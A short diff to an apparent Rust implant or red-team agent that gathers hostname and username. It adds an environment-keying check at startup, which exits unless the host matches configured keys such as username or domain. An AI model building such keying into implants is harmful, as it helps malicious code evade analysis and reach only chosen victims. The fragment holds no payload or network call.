@@ -11,6 +11,7 @@ use std::env::args;
 use std::process::exit;
 use std::process::Command;
 use rand::prelude::*;
+mod env_key;
 
 use whoami::hostname;
 use reqwest::Client;
@@ -105,9 +106,18 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             };
         }
     }
-    
-    let mut hn = hostname();
 
+    // Before anything else happens, we key to the env if the config has been set.
+    let keyed_result: bool = env_key::check_env_keys(&mut config_options).await;
+    // match the keyed results. This is boiled down to a bool to account for any type of keying (by username, domain, etc)
+    if let true = keyed_result {
+        println!("[+] Key matches, continuing...")
+    } else {
+        println!("[-] No key match. Shutting down...");
+        exit(1)
+    }
+
+    let mut hn = hostname();
     let username = whoami::username();
     hn.push_str(" | ");
     hn.push_str(&username);
